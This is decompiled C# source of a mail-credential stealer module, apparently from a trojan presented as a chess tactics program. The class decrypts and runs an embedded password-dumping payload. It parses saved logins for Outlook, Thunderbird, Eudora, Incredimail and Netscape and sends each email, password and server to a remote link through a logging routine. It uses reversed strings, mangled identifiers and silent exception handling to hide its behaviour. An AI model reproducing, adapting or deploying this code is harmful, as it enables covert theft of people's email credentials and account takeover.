using System;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;

// Token: 0x02000011 RID: 17
internal class RecoverMail
{
	// Token: 0x06000052 RID: 82 RVA: 0x00003E04 File Offset: 0x00002E04
	public RecoverMail()
	{
		this.R_List = this.ReadMail();
	}

	// Token: 0x06000053 RID: 83 RVA: 0x00003E18 File Offset: 0x00002E18
	public void Outlook()
	{
		this.FandS("Outlook");
	}

	// Token: 0x06000054 RID: 84 RVA: 0x00003E28 File Offset: 0x00002E28
	public void Thunderbird()
	{
		this.FandS("_Thunder_bird".Replace("_", null));
	}

	// Token: 0x06000055 RID: 85 RVA: 0x00003E40 File Offset: 0x00002E40
	public void Eudora()
	{
		this.FandS("Eudora");
	}

	// Token: 0x06000056 RID: 86 RVA: 0x00003E50 File Offset: 0x00002E50
	public void Incredimail()
	{
		this.FandS("Incredimail");
	}

	// Token: 0x06000057 RID: 87 RVA: 0x00003E60 File Offset: 0x00002E60
	public void NetScape()
	{
		this.FandS("Netscape");
	}

	// Token: 0x06000058 RID: 88 RVA: 0x00003E70 File Offset: 0x00002E70
	public string ReadMail()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "\\Mails.txt";
		string result;
		try
		{
			if (!File.Exists(text))
			{
				Assembly assembly = (Assembly)typeof(Assembly).GetMethod(Strings.StrReverse("ylbmessAgnitucexEteG")).Invoke(null, null);
				ResourceManager resourceManager = new ResourceManager("Key", assembly);
				byte[] bytes = Encoding.Unicode.GetBytes("Password");
				string executablePath = Application.ExecutablePath;
				string cmd = "/stext " + text;
				byte[] ƈƖƻƨÔ = (byte[])resourceManager.GetObject("RecoverMail");
				Óµ.ØØØØ(executablePath, cmd, Encryption.RSMDecrypt(ƈƖƻƨÔ, bytes), false);
				while (!File.Exists(text))
				{
					Thread.Sleep(1000);
				}
			}
			result = File.ReadAllText(text);
		}
		catch (Exception ex)
		{
		}
		return result;
	}

	// Token: 0x06000059 RID: 89 RVA: 0x00003F5C File Offset: 0x00002F5C
	public void FandS(string MailClient)
	{
		checked
		{
			try
			{
				Thread.Sleep(1000);
				int count = Regex.Matches(this.R_List, Regex.Escape("Application")).Count;
				for (int i = 0; i < count; i++)
				{
					string between = this.GetBetween(this.R_List, "Email             : ", "\r\n", i);
					string between2 = this.GetBetween(this.R_List, "Password          : ", "\r\n", i);
					string between3 = this.GetBetween(this.R_List, "Server            : ", "\r\n", i);
					string between4 = this.GetBetween(this.R_List, "Application       : ", "\r\n", i);
					bool flag = this.Is_Containing(between4, MailClient);
					if (flag)
					{
						Send.SendLog(ChessTacticsPro.P_Link, "Passwords", null, null, between4, between3, between, between2, null);
					}
				}
			}
			catch (Exception ex)
			{
			}
		}
	}

	// Token: 0x0600005A RID: 90 RVA: 0x0000404C File Offset: 0x0000304C
	public string GetBetween(string input, string str1, string str2, int ind)
	{
		string input2 = Regex.Split(input, str1)[checked(ind + 1)];
		return Regex.Split(input2, str2)[0];
	}

	// Token: 0x0600005B RID: 91 RVA: 0x00004074 File Offset: 0x00003074
	public bool Is_Containing(string input, string search)
	{
		return input.Contains(search);
	}

	// Token: 0x04000024 RID: 36
	private string R_List;
}
